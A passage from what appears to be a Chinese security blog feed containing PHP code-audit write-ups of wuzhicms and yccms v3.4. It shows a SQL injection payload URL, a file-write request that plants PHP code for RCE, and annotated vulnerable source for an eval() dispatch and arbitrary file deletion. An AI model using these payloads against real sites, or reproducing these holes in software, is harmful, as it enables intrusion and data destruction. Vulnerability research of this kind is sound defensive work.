class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php?param&#x3D;1%27%20or%20extractvalue(1,concat(0x7e,(select%20user())))%20–+</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080956325.png" alt="20250717144135245"></p><h2 id="任意文件写入导致RCE"><a href="#任意文件写入导致RCE" class="headerlink" title="任意文件写入导致RCE"></a>任意文件写入导致RCE</h2><p>搜索<code>file_put_contents()</code> 函数,找到一处写入内容可控的地方。file_put_contents() 函数把一个字符串写入文件中。</p><p>coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;\r\n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?m=attachment<span class="hljs-variable">&amp;f</span>=<span class="hljs-keyword">index</span><span class="hljs-variable">&amp;_su</span>=wuzhicms<span class="hljs-variable">&amp;v</span>=ueditor<span class="hljs-variable">&amp;submit</span>=1<span class="hljs-variable">&amp;setting</span>=%3Cphp%20phpinfo();%3E<br></code></pre></td></tr></table></figure><h2 id="文章："><a href="#文章：" class="headerlink" title="文章："></a>文章：</h2><p>五指CMS 4.1.0存在CSRF漏洞可增加管理员账户</p><p><a href="https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/">https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</a></p><p>wuzhicms代码审计</p><p><a href="https://blog.csdn.net/RestoreJustice/article/details/129734772">https://blog.csdn.net/RestoreJustice/article/details/129734772</a></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms v3.4 代码审计</title>
    <link href="/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="yccms-v3-4-代码审计"><a href="#yccms-v3-4-代码审计" class="headerlink" title="yccms v3.4 代码审计"></a>yccms v3.4 代码审计</h1><p>程序版本：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png" alt="20250708090010810"></p><p>从这个目录结构注意到这是一个MVC模式</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png" alt="20250708135815537"></p><h2 id="通读代码"><a href="#通读代码" class="headerlink" title="通读代码"></a>通读代码</h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>后台入口</p><p>require  引入文件  &#x2F;config&#x2F;run.inc.php 完成网站的初始化</p><p>路由：GET   &#x2F;admin?a&#x3D;</p><h3 id="ceshi1-ceshi2-compile"><a href="#ceshi1-ceshi2-compile" class="headerlink" title="ceshi1&amp;ceshi2&amp;compile"></a>ceshi1&amp;ceshi2&amp;compile</h3><p>都是一些页面模板</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><h4 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h4><p>数据库、Smarty以及其他的系统配置</p><h4 id="count-php"><a href="#count-php" class="headerlink" title="count.php"></a>count.php</h4><p>通过计算根目录，加载 run.inc.php文件</p><h4 id="run-inc-php"><a href="#run-inc-php" class="headerlink" title="run.inc.php"></a>run.inc.php</h4><p>初始化文件、入口文件（进入后台会调用）</p><p>功能：</p><ul><li><p>开启session，设置编码和时区</p></li><li><p>引入配置文件和模板：<code>config/config.inc.php</code></p><p>​    <code>/public/smarty/Smarty.class.php</code></p></li><li><p>自动加载类：<code>__autoload()方法用于自动加载类</code></p><p>​                    Action的类加载controller</p><p>​                    Model的类加载model</p><p>​                    其他的类加载public&#x2F;class&#x2F;</p></li><li><p>单入口：<code>Factory::setAction()-&gt;run();</code>调用控制器的run()，</p></li></ul><p>安全问题：入口文件的Factory给下面的RCE提供了入口点</p><p>配置文件会有漏洞吗？配置文件会不会泄露数据库信息？</p><h3 id="contrller"><a href="#contrller" class="headerlink" title="contrller"></a>contrller</h3><h4 id="Action-class-php"><a href="#Action-class-php" class="headerlink" title="Action.class.php"></a>Action.class.php</h4><p>所有控制器的父类</p><p>功能：</p><ul><li>定义属性</li><li>构造函数</li><li>分页、静态分页功能</li><li>控制器运行入口</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//控制器基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> </span>&#123;<span class="hljs-comment">//声明Action类，属于所有控制器的父类</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_tpl</span> = <span class="hljs-literal">null</span>;<span class="hljs-comment">//定义属性</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//__construct() 构造函数，就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。但这里是protected，就不能在类的外部直接new这个类，只能在子类中通过继承使用。</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl = TPL::<span class="hljs-title function_ invoke__">getInstance</span>();<span class="hljs-comment">//模板渲染</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setModel</span>();<span class="hljs-comment">//创建模型对象</span><br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">setRequest</span>(); <span class="hljs-comment">//表单转义和html过滤可以防XSS、SQL</span><br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<span class="hljs-comment">//定义了一个分页函数</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Validate</span>::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_model</span>) ? <span class="hljs-variable language_">$this</span>-&gt;_model : <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">showpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><span class="hljs-comment">//静态专用</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page2</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>,<span class="hljs-variable">$_url2</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_fx</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<span class="hljs-comment">//另一种分页</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>,<span class="hljs-variable">$_url2</span>,<span class="hljs-variable">$_fx</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">listpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//控制器运行入口</span><br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<span class="hljs-comment">//url传参&#x27;?m=&#x27;,默认为index</span><br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<span class="hljs-comment">//eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce</span><br> &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="AdminAction-class-php"><a href="#AdminAction-class-php" class="headerlink" title="AdminAction.class.php"></a>AdminAction.class.php</h4><p>管理员控制器</p><p>功能：</p><ul><li><p>加载后台首页</p></li><li><p>更改密码：使用sha1加密不安全</p></li><li><p>系统信息显示：</p><p>系统信息页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png" alt="20250711132213642"></p></li><li><p>退出时清理缓存：删除 compile 目录文件</p></li></ul><p>路由：?a&#x3D;admin&amp;m&#x3D;update -&gt; 调用 update()</p><h4 id="ArticleAction-class-php"><a href="#ArticleAction-class-php" class="headerlink" title="ArticleAction.class.php"></a>ArticleAction.class.php</h4><p>文章控制器，</p><p>功能：显示文章列表</p><p>​提供搜索功能</p><p>​增删修改文章</p><p>​nav、attr（文章的修饰属性）等功能</p><h4 id="CallAction-class-php"><a href="#CallAction-class-php" class="headerlink" title="CallAction.class.php"></a>CallAction.class.php</h4><p>功能： 验证码生成</p><p>​后台文件上传</p><p>​编辑器上传</p><h4 id="HtmlAction-class-php"><a href="#HtmlAction-class-php" class="headerlink" title="HtmlAction.class.php"></a>HtmlAction.class.php</h4><p>生成静态控制器</p><blockquote><p><strong>生成静态页面：</strong></p><p>首先调用模型，取出数据库内容，之后通过模板引擎渲染页面，输出HTML页面，然后使用工具类<code>Tool::HtmlFile($filename, $content)</code>，把HTML内容保存到指定路径，就可以在前端页面查看了。</p><p><strong>静态页面作用：</strong></p><ul><li>直接访问<code>.html</code>文件，不需要调动数据库查询；</li><li>页面生成后不再执行动态代码，防止SQL注入；</li><li>当然，这种把内容提前准备好的方式，对于提升性能、减少算力、节约服务器资源、服务器更稳定等等有一定的优势。</li></ul></blockquote><p>本网站后台修改文章内容后需要<strong>静态生成</strong>，之后方可在首页显示。</p><p>功能： 生成首页</p><p>​生成文章</p><p>​栏目列表</p><p>​模板渲染</p><p>​静态化输出</p><p>​分步处理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png" alt="20250711154124943"></p><h4 id="LinkAction-class-php"><a href="#LinkAction-class-php" class="headerlink" title="LinkAction.class.php"></a>LinkAction.class.php</h4><p>链接控制器</p><p>功能：后台管理友情链接，修改链接、排序功能</p><h4 id="LoginAction-class-php"><a href="#LoginAction-class-php" class="headerlink" title="LoginAction.class.php"></a>LoginAction.class.php</h4><p>登录控制器</p><p>功能：登录验证：sha1加密密码</p><p>​验证码</p><p>​记住密码</p><p>​AJAX 验证</p><h4 id="NavAction-class-php"><a href="#NavAction-class-php" class="headerlink" title="NavAction.class.php"></a>NavAction.class.php</h4><p>分类控制器</p><p>功能：查看、排序、增删修改分类列表</p><h4 id="PicAction-class-php"><a href="#PicAction-class-php" class="headerlink" title="PicAction.class.php"></a>PicAction.class.php</h4><p>图片控制器</p><p>功能：</p><ul><li><p>后台图片展示：读取根目录中的uploads文件夹，但是没有过滤文件非法后缀，此处可能上传 .php 文件</p></li><li><p>删除：没有检验图片路径，存在任意文件删除漏洞</p></li><li><p>这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//图片控制器</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PicAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>&#125;<br>    <span class="hljs-comment">//这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>);<span class="hljs-comment">//打开 /uploads/ 目录</span><br><span class="hljs-variable">$_dirName</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//保存图片名</span><br><span class="hljs-variable">$_picArr</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">while</span>(!!<span class="hljs-variable">$_dirName</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$_dirPath</span>))&#123;<span class="hljs-comment">//遍历 uploads 下的文件，此处无过滤</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;..&#x27;</span>)&#123;<br><span class="hljs-variable">$_picArr</span>[] = <span class="hljs-variable">$_dirName</span>;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">krsort</span>(<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//逆序排列</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picNum&#x27;</span>,<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>))-<span class="hljs-number">2</span>);<span class="hljs-comment">//获取上传的文件数</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picArr&#x27;</span>,<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//显示上传文件</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/picshow.tpl&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//上传目录的跟路径</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="SearchAction-class-php"><a href="#SearchAction-class-php" class="headerlink" title="SearchAction.class.php"></a>SearchAction.class.php</h4><p>搜索控制器</p><p>功能：用于前端页面的内容搜索</p><h4 id="SystemAction-class-php"><a href="#SystemAction-class-php" class="headerlink" title="SystemAction.class.php"></a>SystemAction.class.php</h4><p>系统设置控制器</p><p>功能：后台系统信息、设置首页文字内容</p><h2 id="记一些知识点、函数"><a href="#记一些知识点、函数" class="headerlink" title="记一些知识点、函数"></a>记一些知识点、函数</h2><p><a href="https://www.cnblogs.com/phpper/p/8976304.html">PHP 中 private、public、protected区别</a></p><p><a href="https://jueee.github.io/2020/10/2020-10-20-PHP%E4%B9%8BSmarty%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/">PHP 之 Smarty 模板引擎使用汇总</a></p><p>Smarty 是 PHP 的一个引擎模板，可以将 MVC 中的 C 分离出来。</p><p><a href="https://blog.csdn.net/weixin_50602266/article/details/121910781">JavaScript之Ajax</a></p><blockquote><p>AJAX (Asynchronous JavaScript and XML) 异步 JS 和 XML，在不刷新整个页面的情况下，与服务器交换数据的技术。</p></blockquote><h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><blockquote><p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul></blockquote><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-47137">YCCMS存在文件上传漏洞（CNVD-2021-47137）</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46794">YCCMS存在文件上传漏洞（CNVD-2021-46794）</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46795">YCCMS存在逻辑缺陷漏洞</a></p><h3 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h3><p>根据Action.class.php审计，发现<code>method_exists($this, $_m) ? eval(&#39;$this-&gt;&#39;.$_m.&#39;();&#39;) : $this-&gt;index();</code></p><p>eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config&#x2F;run.inc.php 这个文件，存在rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//config/run.inc.php  </span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br><br>-&gt;<span class="hljs-title function_ invoke__">setAction</span>()<br><br><span class="hljs-comment">//public/class/Factory.class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Factory</span></span>&#123;<br>    ...<br><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<span class="hljs-comment">//$_a 是get传参，可控变量</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;  <br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ 